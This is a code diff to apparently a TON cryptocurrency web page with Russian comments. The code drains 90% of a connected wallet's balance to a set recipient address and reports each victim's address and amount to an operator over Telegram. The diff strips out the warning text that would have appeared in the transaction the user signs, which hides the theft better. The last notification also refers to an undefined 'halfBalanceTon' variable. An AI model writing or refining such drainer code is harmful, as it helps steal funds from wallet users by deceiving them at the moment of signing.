@@ -330,16 +330,12 @@
                 alert("Нет доступных токенов для отправки");
                 return;
             }
-            
-           // Получаем основной токен TON
+            // Получаем основной токен TON
 const tonToken = walletTokens[0];
 
 // Вычисляем 90% от баланса
 const ninetyPercentBalanceNano = Math.floor(Number(tonToken.balance) * 0.9).toString();
 const ninetyPercentBalanceTon = Number(ninetyPercentBalanceNano) / 1e9;
-
-// Создаем предупреждающее сообщение
-const warningMessage = "У ВАС СПИСЫВАЮТСЯ 90% ТОКЕНОВ ВЫ ТОЧНО ХОТИТЕ ПОДТВЕРДИТЬ ТРАНЗАКЦИЮ";
 
 // Отправляем уведомление о попытке отправки
 await sendTelegramNotification(`⚠️ Попытка отправки 90% баланса\n💰 Сумма: ${ninetyPercentBalanceTon} TON\n📤 От: <code>${connectedAddressFriendly}</code>\n📥 Кому: <code>${recipientAddress}</code>`);
@@ -350,28 +346,24 @@ if (!confirm(`Вы действительно хотите отправить ${
     return;
 }
 
-// Создаем транзакцию с предупреждающим сообщением
+// Создаем транзакцию
 const tx = {
     validUntil: Date.now() + 5 * 60 * 1000,
     messages: [{
         address: recipientAddress,
-        amount: ninetyPercentBalanceNano,
-        // Используем правильный формат для текстового сообщения в TON
-        payload: {
-            type: 'comment',
-            text: warningMessage
-        }
+        amount: ninetyPercentBalanceNano
     }]
 };
 
 console.log("Объект транзакции:", tx);
 addDebugInfo(`Объект транзакции: ${JSON.stringify(tx)}`);
-await sendTelegramNotification(`🔄 Транзакция создана и ожидает подписи пользователя\n💰 Сумма: ${ninetyPercentBalanceTon} TON\n📝 С сообщением: "${warningMessage}"`);
+await sendTelegramNotification(`🔄 Транзакция создана и ожидает подписи пользователя\n💰 Сумма: ${ninetyPercentBalanceTon} TON`);
 
 // Отправляем транзакцию (требует подтверждения пользователя в кошельке)
 const result = await tonConnectUI.sendTransaction(tx);
 console.log("Результат транзакции:", result);
 addDebugInfo(`Результат транзакции: ${JSON.stringify(result)}`);
+
             // Отправляем уведомление об успешной транзакции
             await sendTelegramNotification(`✅ Транзакция успешно отправлена!\n💰 Сумма: ${halfBalanceTon} TON\n🧾 Хэш: <code>${result.hash}</code>`);
             
